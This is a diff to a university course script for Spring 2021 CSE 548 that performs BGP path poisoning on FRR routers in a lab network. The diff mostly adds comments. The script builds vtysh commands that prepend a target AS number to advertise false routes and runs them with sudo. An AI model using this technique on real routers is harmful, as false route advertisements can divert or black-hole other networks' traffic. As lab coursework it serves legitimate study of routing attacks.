@@ -1,11 +1,28 @@
+'''
+The path poisoning implementation
+for Spring 2021 CSE 548
+authors: Austin Derbique, Ryan Schmidt, Kirtus Leyba
+
+This script implements path poisoning in an ansible environment
+of BGP routers
+
+syntax:
+
+python pathpoison.py <sourceASN> <targetASN>
+
+'''
+
 import argparse
 import os
 
+### set up an argument parser
 parser = argparse.ArgumentParser(description="Change Router Configuration to Poison Target")
 parser.add_argument("sourceASN", type=int, help="The ASN conducting the poisoning")
 parser.add_argument("targetASN", type=int, help="The ASN to poisoning")
 args = parser.parse_args()
 
+### ip to ASN mapping:
+### NOTE: For custom topologies please reset this!
 asn_ip_mapping = {}
 asn_ip_mapping[64512] = {64514:"10.1.12.2",\
 						64515:"10.1.15.1"}
@@ -46,6 +63,10 @@ asn_ip_mapping[64523] = {64517:"10.1.23.2",\
 sourceASN = args.sourceASN
 targetASN = args.targetASN
 
+## construct command string to execute poisoning
+
+
+### step 1: Build new route map for false routes
 cmdstring = "sudo frr.vtysh -d bgpd -c \"configure terminal\" "
 cmdstring += "-c \"route-map testpoison permit 90\" "
 cmdstring += "-c \"set as-path prepend {}\" ".format(targetASN)
@@ -54,6 +75,8 @@ cmdstring += "-c \"do write memory\""
 print("Running: {}".format(cmdstring))
 os.system(cmdstring)
 
+
+### step 2: Try to change rule for neighbor
 try:
 	cmdstring = "sudo frr.vtysh -d bgpd -c \"configure terminal\" "
 	cmdstring += "-c \"router bgp {}\" ".format(sourceASN)
